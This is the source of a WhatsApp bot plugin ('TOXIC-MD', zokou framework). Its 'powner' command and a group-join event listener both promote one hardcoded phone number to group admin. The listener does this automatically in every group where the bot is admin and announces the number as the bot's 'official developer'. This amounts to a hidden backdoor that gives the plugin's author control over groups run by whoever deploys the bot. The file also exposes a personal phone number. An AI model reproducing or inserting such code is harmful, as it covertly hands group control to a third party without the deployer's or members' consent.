const { zokou } = require('../framework/zokou');

// Define the owner number at the top
const OWNER_NUMBER = "+254735342808"; // Owner's phone number with country code
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`; // Formatted JID for WhatsApp

zokou({ nomCom: "powner", categorie: "Group", reaction: "👑" }, async (dest, zk, commandeOptions) => {
  const { ms, repondre, verifGroupe, infosGroupe, superUser, auteurMessage, verifAdminBot } = commandeOptions;

  console.log(`[DEBUG] powner command triggered by ${ms.key.participant || ms.key.remoteJid} in ${dest}`);

  // Check if the command is used in a group
  if (!verifGroupe) {
    console.log(`[DEBUG] powner: Not a group chat`);
    repondre("𝐓𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐢𝐬 𝐟𝐨𝐫 𝐠𝐫𝐨𝐮𝐩𝐬 𝐨𝐧𝐥𝐲 🚫");
    return;
  }

  // Check if the user is the owner (superUser)
  if (!superUser) {
    console.log(`[DEBUG] powner: User is not the owner`);
    repondre("𝐎𝐧𝐥𝐲 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐨𝐰𝐧𝐞𝐫 𝐜𝐚𝐧 𝐮𝐬𝐞 𝐭𝐡𝐢𝐬 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 🚫");
    return;
  }

  // Check if the bot is an admin
  if (!verifAdminBot) {
    console.log(`[DEBUG] powner: Bot is not an admin`);
    repondre(`
𝐓𝐎𝐗𝐈𝐂-𝐌𝐃

◈━━━━━━━━━━━━━━━━◈
│❒ 𝗣𝗼𝘄𝗻𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 👑
│❒ 𝐈 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐛𝐞 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧 𝐭𝐨 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 𝐲𝐨𝐮 😅
│❒ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐦𝐚𝐤𝐞 𝐦𝐞 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧 𝐟𝐢𝐫𝐬𝐭!
◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Get group metadata to check participants
  const metadata = await zk.groupMetadata(dest);
  const membresGroupe = verifGroupe ? await infosGroupe.participants : [];
  const ownerJid = OWNER_JID; // Use the defined owner JID

  // Check if the owner is in the group
  const ownerInGroup = membresGroupe.some(member => member.id === ownerJid);
  if (!ownerInGroup) {
    console.log(`[DEBUG] powner: Owner is not in the group`);
    repondre(`
𝐓𝐎𝐗𝐈𝐂-𝐌𝐃

◈━━━━━━━━━━━━━━━━◈
│❒ 𝗣𝗼𝘄𝗻𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 👑
│❒ 𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐭 𝐢𝐧 𝐭𝐡𝐢𝐬 𝐠𝐫𝐨𝐮𝐩, 𝐛𝐨𝐬𝐬 🤔
│❒ 𝐉𝐨𝐢𝐧 𝐭𝐡𝐞 𝐠𝐫𝐨𝐮𝐩 𝐟𝐢𝐫𝐬𝐭, 𝐚𝐧𝐝 𝐈'𝐥𝐥 𝐡𝐚𝐧𝐝𝐥𝐞 𝐭𝐡𝐞 𝐫𝐞𝐬𝐭!
◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Check if the owner is already an admin
  const ownerMember = membresGroupe.find(member => member.id === ownerJid);
  const ownerIsAdmin = ownerMember.admin !== null;

  if (ownerIsAdmin) {
    console.log(`[DEBUG] powner: Owner is already an admin`);
    repondre(`
𝐓𝐎𝐗𝐈𝐂-𝐌𝐃

◈━━━━━━━━━━━━━━━━◈
│❒ 𝗣𝗼𝘄𝗻𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 👑
│❒ 𝐘𝐨𝐮'𝐫𝐞 𝐚𝐥𝐫𝐞𝐚𝐝𝐲 𝐚𝐧 𝐚𝐝𝐦𝐢𝐧, 𝐛𝐨𝐬𝐬 ✅
│❒ 𝐍𝐨 𝐧𝐞𝐞𝐝 𝐭𝐨 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 𝐲𝐨𝐮—𝐲𝐨𝐮'𝐫𝐞 𝐠𝐨𝐨𝐝!
◈━━━━━━━━━━━━━━━━◈`);
    return;
  }

  // Promote the owner to admin
  try {
    console.log(`[DEBUG] powner: Promoting owner to admin: ${ownerJid}`);
    await zk.groupParticipantsUpdate(dest, [ownerJid], "promote");
    console.log(`[DEBUG] powner: Owner promoted successfully`);
    repondre(`
𝐓𝐎𝐗𝐈𝐂-𝐌𝐃

◈━━━━━━━━━━━━━━━━◈
│❒ 𝗣𝗼𝘄𝗻𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀 👑
│❒ 𝐈'𝐯𝐞 𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐝 𝐲𝐨𝐮 𝐭𝐨 𝐚𝐝𝐦𝐢𝐧, 𝐛𝐨𝐬𝐬 ✅
│❒ 𝐘𝐨𝐮'𝐫𝐞 𝐧𝐨𝐰 𝐢𝐧 𝐜𝐡𝐚𝐫𝐠𝐞 𝐡𝐞𝐫𝐞!
◈━━━━━━━━━━━━━━━━◈`);
  } catch (e) {
    console.log(`[DEBUG] powner: Error promoting owner: ${e}`);
    repondre(`
𝐓𝐎𝐗𝐈𝐂-𝐌𝐃

◈━━━━━━━━━━━━━━━━◈
│❒ 𝗣𝗼𝘄𝗻𝗲𝗿 𝗘𝗿𝗿𝗼𝗿 👑
│❒ 𝐂𝐨𝐮𝐥𝐝𝐧'𝐭 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 𝐲𝐨𝐮, 𝐛𝐨𝐬𝐬 😓
│❒ 𝐄𝐫𝐫𝐨𝐫: ${e.message}
◈━━━━━━━━━━━━━━━━◈`);
  }
});

// Event listener for automatic promotion when the owner joins a group
zokou.on('group-participants-update', async (update) => {
  const { id, participants, action } = update;

  console.log(`[DEBUG] group-participants-update: Action: ${action}, Group: ${id}, Participants: ${participants}`);

  // Only proceed if the action is 'add' (someone joined the group)
  if (action !== 'add') {
    console.log(`[DEBUG] group-participants-update: Ignoring non-add action`);
    return;
  }

  // Check if the bot is an admin in the group
  const metadata = await zokou.groupMetadata(id);
  const botJid = zokou.user.id;
  const botMember = metadata.participants.find(member => member.id === botJid);
  const botIsAdmin = botMember.admin !== null;

  if (!botIsAdmin) {
    console.log(`[DEBUG] group-participants-update: Bot is not an admin in group ${id}`);
    return;
  }

  // Check if the owner is among the participants who joined
  const ownerJid = OWNER_JID;
  const ownerJoined = participants.includes(ownerJid);

  if (!ownerJoined) {
    console.log(`[DEBUG] group-participants-update: Owner did not join`);
    return;
  }

  // Check if the owner is already an admin
  const ownerMember = metadata.participants.find(member => member.id === ownerJid);
  const ownerIsAdmin = ownerMember.admin !== null;

  if (ownerIsAdmin) {
    console.log(`[DEBUG] group-participants-update: Owner is already an admin`);
    return;
  }

  // Promote the owner to admin
  try {
    console.log(`[DEBUG] group-participants-update: Promoting owner to admin: ${ownerJid}`);
    await zokou.groupParticipantsUpdate(id, [ownerJid], "promote");
    console.log(`[DEBUG] group-participants-update: Owner promoted successfully`);

    // Send a message in the group
    await zokou.sendMessage(id, { text: `
𝐓𝐎𝐗𝐈𝐂-𝐌𝐃

◈━━━━━━━━━━━━━━━━◈
│❒ 𝗦𝗽𝗲𝗰𝗶𝗮𝗹 𝗔𝗻𝗻𝗼𝘂𝗻𝗰𝗲𝗺𝗲𝗻𝘁 🎉
│❒ 𝐇𝐞𝐥𝐥𝐨 𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐠𝐮𝐞𝐬𝐬 𝐰𝐡𝐨'𝐬 𝐡𝐞𝐫𝐞.
│❒ 𝐌𝐲 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐩𝐥𝐞𝐚𝐬𝐞 𝐠𝐢𝐯𝐞 𝐡𝐢𝐦 𝐚 𝐰𝐚𝐫𝐦 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 🤩⭐
│❒ 𝐈'𝐯𝐞 𝐩𝐫𝐨𝐦𝐨𝐭𝐞𝐝 𝐡𝐢𝐦 𝐭𝐨 𝐚𝐝𝐦𝐢𝐧 𝐚𝐮𝐭𝐨𝐦𝐚𝐭𝐢𝐜𝐚𝐥𝐥𝐲 ✅
◈━━━━━━━━━━━━━━━━◈` });
  } catch (e) {
    console.log(`[DEBUG] group-participants-update: Error promoting owner: ${e}`);
    await zokou.sendMessage(id, { text: `
𝐓𝐎𝐗𝐈𝐂-𝐌𝐃

◈━━━━━━━━━━━━━━━━◈
│❒ 𝗦𝗽𝗲𝗰𝗶𝗮𝗹 𝗔𝗻𝗻𝗼𝘂𝗻𝗰𝗲𝗺𝗲𝗻𝘁 🎉
│❒ 𝐇𝐞𝐥𝐥𝐨 𝐞𝐯𝐞𝐫𝐲𝐨𝐧𝐞 𝐠𝐮𝐞𝐬𝐬 𝐰𝐡𝐨'𝐬 𝐡𝐞𝐫𝐞.
│❒ 𝐌𝐲 𝐨𝐟𝐟𝐢𝐜𝐢𝐚𝐥 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 𝐩𝐥𝐞𝐚𝐬𝐞 𝐠𝐢𝐯𝐞 𝐡𝐢𝐦 𝐚 𝐰𝐚𝐫𝐦 𝐰𝐞𝐥𝐜𝐨𝐦𝐞 🤩⭐
│❒ 𝐁𝐮𝐭 𝐈 𝐜𝐨𝐮𝐥𝐝𝐧'𝐭 𝐩𝐫𝐨𝐦𝐨𝐭𝐞 𝐡𝐢𝐦 😓
│❒ 𝐄𝐫𝐫𝐨𝐫: ${e.message}
◈━━━━━━━━━━━━━━━━◈` });
  }
});